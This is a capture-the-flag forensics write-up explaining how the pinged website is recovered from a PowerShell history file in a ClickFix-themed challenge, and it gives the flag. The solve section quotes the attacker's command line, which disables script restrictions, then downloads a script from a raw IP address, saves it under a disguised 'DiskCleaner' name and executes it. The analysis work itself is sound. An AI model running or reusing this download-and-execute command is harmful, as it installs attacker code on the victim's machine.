# Ping Pong — Writeup

- Category: Forensics
- Value: 987
- Author: boom

## Challenge

> What website does the PowerShell script they executed ping?
>
> **FLAG FORMAT:** `CIT{website}`

## Recon

This also reuses the same `challenge.zip` from the ClickFix chain.
The obvious place to look is PowerShell history:

```text
AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
```

## Solve

The saved command history contains:

```text
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
$p='unewhaven.com'; Test-Connection $p -Count 6 | Out-Null; $j='http://23.179.17.92/az.ps1'; $c=Join-Path $env:APPDATA 'DiskCleaner.ps1'; Start-BitsTransfer -Source $j -Destination $c; & $c
```

The variable `$p` is the host passed to `Test-Connection`, so the script pings:

```text
unewhaven.com
```

## Flag

```text
CIT{unewhaven.com}
```

## Files

- [challenge.zip](files/challenge.zip)
- [solve.py](scripts/solve.py)
- [consolehost_history.txt](other/consolehost_history.txt)
